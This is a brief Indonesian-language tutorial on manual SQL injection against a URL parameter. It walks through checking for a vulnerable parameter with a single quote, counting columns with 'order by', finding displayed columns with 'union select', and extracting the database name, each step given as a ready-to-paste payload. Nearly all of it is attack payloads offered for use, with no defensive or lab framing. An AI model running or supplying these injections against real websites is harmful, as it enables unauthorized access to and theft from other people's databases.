# Cari Paramter Vulner

Dengan menggunakan petik atau lainnya `'`.
Jika muncul error maka vulner.
Lanjut untuk query injection.

```
?param=1' order by 1--+-
```

Untuk mencari berapa jumlah kolom pada tabel angka satu di urutkan sampai menemukan error.
Setalah menemukan jumlah kolom maka lanjut dengan query untuk menampilkan tempat di mana kolom itu di letakkan.

```
?param=-1' union select 1,2,3--+-
```

Coba untuk menampilkan nama database

```
?param=-1' union select 1,database(),3--+-
```

